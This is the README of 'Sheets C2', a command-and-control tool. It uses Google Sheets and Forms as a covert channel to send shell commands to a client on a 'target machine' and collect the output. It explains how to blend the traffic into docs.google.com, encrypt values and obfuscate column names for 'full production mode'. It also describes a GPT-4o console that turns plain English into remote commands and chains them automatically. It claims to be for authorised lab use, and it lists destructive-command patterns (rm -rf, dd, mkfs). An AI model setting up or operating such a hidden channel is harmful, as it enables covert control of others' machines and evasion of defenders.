# Sheets C2

A lightweight remote task execution system that uses Google Sheets as a covert message broker. A server operator dispatches shell commands to a remote client through a shared spreadsheet. The client polls for tasks, executes them, and writes results back. An AI-powered operator console (GPT-4o) translates natural language into commands and interprets results in real time.

Built for security research and authorized penetration testing in controlled lab environments.

---

## Architecture

```
┌─────────────────────────────────────────────────────┐
│                  Google Sheets                      │
│                                                     │
│  ┌──────────┐   ┌──────────┐   ┌──────────────┐    │
│  │  config  │   │  inbox   │   │   outbox     │    │
│  │ (config) │   │ (tasks)  │   │  (results)   │    │
│  └──────────┘   └──────────┘   └──────────────┘    │
└──────────────────────┬──────────────┬───────────────┘
                       │              │
          Forms POST   │              │   Forms POST
          (write)      │              │   (write)
                       │              │
            ┌──────────▼──┐      ┌────▼──────────┐
            │   server.py │      │   client.py   │
            │             │      │               │
            │  send       │      │  poll loop    │
            │  collect    │      │  execute      │
            │  ai (GPT4o) │      │  heartbeat    │
            └─────────────┘      └───────────────┘
```

**Communication flow:**

- Server writes tasks → inbox tab via Google Forms POST
- Client reads inbox → CSV export (unauthenticated read)
- Client writes results → outbox tab via Google Forms POST
- Server reads outbox → CSV export

All traffic goes to `docs.google.com`. Google Forms is used for writes because it is the only unauthenticated append endpoint for Google Sheets — no API keys or OAuth required on the client.

---

## File Structure

```
sheets-c2/
├── client.py            # Polling agent — reads tasks, executes, writes results
├── server.py            # Operator interface — send, collect, AI console
├── common.py            # Shared I/O layer — sheet reads, form writes, encryption boundary
├── system_prompt.txt    # GPT-4o system prompt — edit to change AI behavior
├── crypto/
│   ├── base.py          # Abstract Encryptor class
│   ├── plaintext.py     # Pass-through (no encryption, default)
│   └── fernet.py        # AES-128-CBC + HMAC-SHA256 via cryptography.Fernet
├── .env                 # Runtime config (not committed)
├── .env.example         # Template with all required and optional keys
└── requirements.txt     # Python dependencies
```

---

## Prerequisites

- Python 3.8+
- A Google account
- Internet access to `docs.google.com`
- An OpenAI API key (for `server.py ai` mode only)

---

## Installation

```bash
git clone <repo>
cd sheets-c2
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Google Sheets Setup

Create one spreadsheet with **two tabs** (config tab is no longer used). Share it as **"Anyone with the link can view"** — required for unauthenticated CSV export.

> **Note:** The `config` tab has been replaced by the `config` command. Client polling parameters are sent from the server like any other command and are persisted on the client in `.client_config.json`. No config tab or `CONFIG_GID` is needed.

### Tab: `inbox`

Default column headers (use as-is, or rename to random names — see [Column Obfuscation](#column-name-obfuscation)):

`command_id`, `command`, `payload`, `target`, `status`, `created_at`

Leave empty — server writes here via Forms.

### Tab: `outbox`

Default column headers (use as-is, or rename to random names):

`command_id`, `client_id`, `status`, `result`, `timestamp`

Leave empty — client writes here via Forms.

> **Important:** When linking a Google Form to a sheet, Forms auto-creates a new tab and adds a `Timestamp` column. Rename that column to `form_timestamp` to avoid collision with the `timestamp` field. Re-check all GIDs after linking — the linked tab gets a new GID, not the one from the original empty tab.

---

## Google Forms Setup

Two forms are required — one per tab (inbox and outbox; no config form needed).

### Outbox Form (client → server, links to `outbox` tab)

| Field label | Links to column |
|-------------|-----------------|
| `command_id` | `command_id` |
| `client_id` | `client_id` |
| `status` | `status` |
| `result` | `result` |
| `timestamp` | `timestamp` |

If using column obfuscation, use the random names from `OUTBOX_COLUMN_MAP` instead of the logical names above.

### Inbox Form (server → client, links to `inbox` tab)

| Field label | Links to column |
|-------------|-----------------|
| `command_id` | `command_id` |
| `command` | `command` |
| `payload` | `payload` |
| `target` | `target` |
| `status` | `status` |
| `created_at` | `created_at` |

If using column obfuscation, use the random names from `INBOX_COLUMN_MAP` instead.

**Getting entry IDs:** Open the form preview → F12 → search `entry.` in the page source. Each field has a unique `entry.XXXXXXXXX` ID needed for `FORMS_FIELD_MAP`. Entry IDs never change even if you rename the field labels.

---

## Configuration

Copy `.env.example` to `.env` and fill in all values.

```env
# Google Sheets
SPREADSHEET_ID=          # From sheet URL: /d/<ID>/edit
INBOX_GID=               # ?gid=X when inbox tab is selected
OUTBOX_GID=              # ?gid=X when outbox tab is selected
# CONFIG_GID not needed — client config is sent via the config command

# Google Forms
FORMS_URL=               # Outbox form URL ending in /formResponse
FORMS_FIELD_MAP=         # JSON: {"command_id":"entry.X","client_id":"entry.X",...}
INBOX_FORMS_URL=         # Inbox form URL ending in /formResponse
INBOX_FORMS_FIELD_MAP=   # JSON: {"command_id":"entry.X","command":"entry.X",...}

# Encryption
ENCRYPTION_METHOD=       # "plaintext" (default) or "fernet"
ENCRYPTION_KEY=          # Fernet key — generate with: python crypto/fernet.py

# Column obfuscation (optional)
INBOX_COLUMN_MAP=        # JSON: {"command_id":"f3a7k","command":"x9m2p",...}
OUTBOX_COLUMN_MAP=       # JSON: {"command_id":"p7c4s","client_id":"m1z8e",...}

# OpenAI
OPENAI_API_KEY=          # Required for ai mode only
```

### Configuration checklist

- [ ] `SPREADSHEET_ID` — between `/d/` and `/edit` in the sheet URL
- [ ] Sheet shared as "Anyone with the link can view"
- [ ] `INBOX_GID` and `OUTBOX_GID` match `?gid=` params for their tabs; re-check after linking Forms
- [ ] Form URLs end in `/formResponse` (not `/viewform`)
- [ ] `FORMS_FIELD_MAP` keys: `command_id`, `client_id`, `status`, `result`, `timestamp`
- [ ] `INBOX_FORMS_FIELD_MAP` keys: `command_id`, `command`, `payload`, `target`, `status`, `created_at`
- [ ] If using `fernet`: `ENCRYPTION_KEY` is set and identical on both client and server machines
- [ ] If using column maps: sheet column headers and form field labels renamed to match; `INBOX_COLUMN_MAP` and `OUTBOX_COLUMN_MAP` set identically on both machines

---

## Usage

### Start the client

Run on the target machine:

```bash
source venv/bin/activate
python client.py
```

The client loads its persisted config from `.client_config.json` (if present), sends a heartbeat on startup and every 10 poll cycles, then loops: read inbox → execute pending tasks → write results → sleep. Polling parameters update immediately on the next cycle after a `config` command is processed.

### Dispatch a command (server)

```bash
python server.py send --command system_info
python server.py send --command echo --payload '{"msg": "hello"}'
python server.py send --command shell --payload '{"cmd": "whoami"}'
python server.py send --command config --payload '{"poll_interval_sec": "60", "client_id": "agent-01"}'
```

### Read results (server)

```bash
python server.py collect
python server.py collect --id <command_id>
```

### AI operator console (server)

```bash
python server.py ai
```

Type commands in plain English. GPT-4o translates them into structured actions, dispatches to the client, and interprets results as they arrive.

---

## AI Console Reference

### Session modes

| Command | Effect |
|---------|--------|
| `mode auto` | Send commands immediately without confirmation |
| `mode confirm` | Preview and confirm before each send |
| `output raw` / `mode raw` | Display stdout directly |
| `output interpreted` / `mode interpreted` | GPT-4o summarizes results (default) |

### Shortcuts (caught before GPT-4o)

| Input | Effect |
|-------|--------|
| `raw` / `exact` / `full output` | Print raw stdout of last result |
| `?` / `show` / `results` / `digest` | Show any arrived-but-unseen results |
| `do it` / `yes` / `go` | Execute the last AI-suggested command |
| `exit` / `quit` | Exit the console |

### Command chaining

In auto mode, when a result arrives from a multi-step task the AI previously planned, the next step is dispatched automatically (`[Chaining]`). In confirm mode, or when a step has a destructive warning, it falls back to `[Suggestion]` requiring manual confirmation.

### Destructive commands

Commands matching patterns like `rm -rf`, `kill -9`, `shutdown`, `dd`, `mkfs` are flagged with a warning and always require explicit confirmation, regardless of mode.

### Customizing AI behavior

Edit `system_prompt.txt` — loaded fresh at each `server.py ai` session. No code changes needed.

---

## Encryption

Encryption is applied transparently at the read/write boundary in `common.py`. All field values in inbox and outbox are encrypted before writing and decrypted after reading. No changes are needed to any other code — handlers, the AI layer, and server dispatch all work with plaintext.

**The config tab is encrypted and obfuscated on the same rules as inbox and outbox.** Encryption config (`ENCRYPTION_METHOD`, `ENCRYPTION_KEY`, column maps) is always loaded from the local `.env` file — never from the sheet — so there is no chicken-and-egg problem.

### Encryption modes

| `ENCRYPTION_METHOD` | Description |
|---------------------|-------------|
| `plaintext` (default) | No encryption — cleartext values in sheet |
| `fernet` | AES-128-CBC + HMAC-SHA256, key from `ENCRYPTION_KEY` |

### Enabling Fernet

```bash
# 1. Generate a key (run once)
python crypto/fernet.py

# 2. Add to .env on both client and server
ENCRYPTION_METHOD=fernet
ENCRYPTION_KEY=<generated key>
```

Both machines must use the same method and key. Rows that fail decryption are silently passed through as-is, so existing plaintext rows remain readable when switching methods.

### How command_id correlation works under encryption

Fernet is non-deterministic — encrypting the same value twice produces different ciphertext. The `command_id` field appears in both inbox (written by server) and outbox (written by client), so the ciphertexts will differ. This is not a problem: all comparisons happen **after** decryption. The server stores the plaintext UUID when dispatching and compares against the decrypted value when reading outbox. The correlation is always on plaintext.

---

## Column Name Obfuscation

By default, sheet column headers use logical names (`command_id`, `status`, `payload`, etc.) that are visible to anyone with the sheet link, even if the values are encrypted.

Column name obfuscation replaces those headers with short random strings, making the sheet structure unreadable to an observer.

### How it works

- `INBOX_COLUMN_MAP` and `OUTBOX_COLUMN_MAP` map logical field names → random column names
- When these are set, `common.py` translates random keys → logical names after reading the CSV
- The write path is unaffected — `FORMS_FIELD_MAP` maps logical names → entry IDs, which never change
- Random names only affect sheet column headers and form field labels

### Enabling column obfuscation

**1. Choose random names** — generate short strings or use the examples in `.env.example`:

```
CONFIG_COLUMN_MAP={"key":"c8x2n","value":"q5r1m"}
INBOX_COLUMN_MAP={"command_id":"f3a7k","command":"x9m2p","payload":"b4r8w","target":"d1n5q","status":"h6v3j","created_at":"k2y9t"}
OUTBOX_COLUMN_MAP={"command_id":"p7c4s","client_id":"m1z8e","status":"w5g2u","result":"a9b3l","timestamp":"r6q7n"}
```

**2. Rename form field labels** — in each Google Form, rename every field label to its random name from the map. The linked sheet columns automatically update to match.

**3. Add maps to `.env`** on both client and server.

> **Note:** Entry IDs (`entry.XXXXXXXXX`) in `FORMS_FIELD_MAP` do not change when you rename field labels — only the column header in the sheet changes. Your `FORMS_FIELD_MAP` stays exactly the same.

> **Note:** Google Forms auto-adds a `Timestamp` column (renamed to `form_timestamp` during setup). This column is not in any map and will remain visible as-is. It reveals only the submission time, not any payload content.

### Obfuscation modes

Both column obfuscation and value encryption are independent. Use whichever combination fits your situation:

| `ENCRYPTION_METHOD` | Column maps set | Sheet appearance |
|---------------------|-----------------|------------------|
| `plaintext` | No | Readable column names, cleartext values — **debug / showcase mode** |
| `plaintext` | Yes | Random column names, cleartext values — structure hidden, values readable |
| `fernet` | No | Readable column names, encrypted values — values hidden, structure visible |
| `fernet` | Yes | Random column names, encrypted values — **full production mode** |

For debugging or demoing the sheet to others, set `ENCRYPTION_METHOD=plaintext` and remove or comment out the column map vars. No sheet changes needed — just restart client and server.

---

## Available Commands

| Command | Payload | Description |
|---------|---------|-------------|
| `system_info` | none | Returns OS, hostname, architecture, username, Python version |
| `echo` | `{"msg": "..."}` | Returns payload as-is |
| `shell` | `{"cmd": "..."}` | Runs a shell command; optional `"stdin"` field for interactive input |
| `config` | `{"poll_interval_sec": "30", ...}` | Updates client polling config; only known keys accepted; persisted to `.client_config.json` |

**Shell handler notes:**
- 30 second timeout; hanging commands return a timeout error
- `stdin` defaults to `/dev/null` to prevent interactive prompts from blocking
- If `cmd` contains `| sudo -S`, the `stdin` field is ignored to avoid conflict

---

## Limitations

- Google Forms is append-only — inbox and outbox grow unbounded until manually cleared in the sheet
- Result fields are truncated at ~4000 characters (Google Forms field size limit)
- Background result pollers give up after 5 minutes with no response from the client
- Single client per spreadsheet — `client_id` defaults to `worker-01` and can be changed via the `config` command
- The `form_timestamp` column added by Google Forms cannot be renamed or removed and will always appear in the sheet

---

## Roadmap

- Setup script — interactive wizard to create the sheet, forms, generate column maps, and write `.env` automatically
